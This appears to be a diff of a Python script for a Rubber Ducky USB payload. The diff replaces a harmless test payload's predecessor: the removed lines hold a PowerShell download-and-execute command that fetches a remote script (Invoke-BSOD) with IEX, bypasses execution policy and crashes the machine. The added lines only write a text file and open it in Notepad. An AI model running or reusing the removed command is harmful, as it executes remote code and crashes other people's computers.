@@ -1,23 +1,13 @@
 import subprocess
+import tempfile
+import os
 
-# PowerShell command to download and execute the script
-ps_command = """
-IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));
-Invoke-BSOD
-"""
+text = """This is a test payload to check if Rubber Ducky is working!
+It is!"""
 
-# Command to run PowerShell script
-command = ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_command]
+with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt') as temp_file:
+    temp_file.write(text)
+    temp_file_path = temp_file.name  # Get the path of the temporary file
 
-try:
-    # Run the PowerShell command
-    result = subprocess.run(command, check=True, text=True, capture_output=True)
-    
-    # Print the output of the command
-    print("Script Output:", result.stdout)
-    
-    # Print any errors from the command
-    if result.stderr:
-        print("Script Errors:", result.stderr)
-except subprocess.CalledProcessError as e:
-    print(f"Error running PowerShell script: {e}")
+# Open the temporary file with Notepad
+subprocess.run(['notepad.exe', temp_file_path])
